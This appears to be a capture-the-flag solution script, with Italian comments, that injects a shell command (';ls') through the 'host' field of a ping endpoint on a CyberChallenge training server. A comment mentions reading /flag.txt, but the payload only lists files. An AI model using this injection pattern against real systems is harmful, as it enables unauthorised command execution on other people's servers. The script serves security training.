import requests
import json

# URL dell'endpoint dove inviare la richiesta POST
url = 'http://basicrce.challs.cyberchallenge.it/ping'

# Comando che vogliamo iniettare nel parametro hostname
# In questo caso, tentiamo di leggere il contenuto di /flag.txt
payload = {
    'host': ';ls'  # Iniettiamo il comando nel parametro 'host'
}

# Header per indicare che stiamo inviando JSON
headers = {
    'Content-Type': 'application/json'
}

# Inviamo la richiesta POST
response = requests.post(url, headers=headers, data=json.dumps(payload))

# Stampa la risposta del server
print('Response Status Code:', response.status_code)
print('Response Content:', response.content.decode())
print('Response Headers:', response.headers)
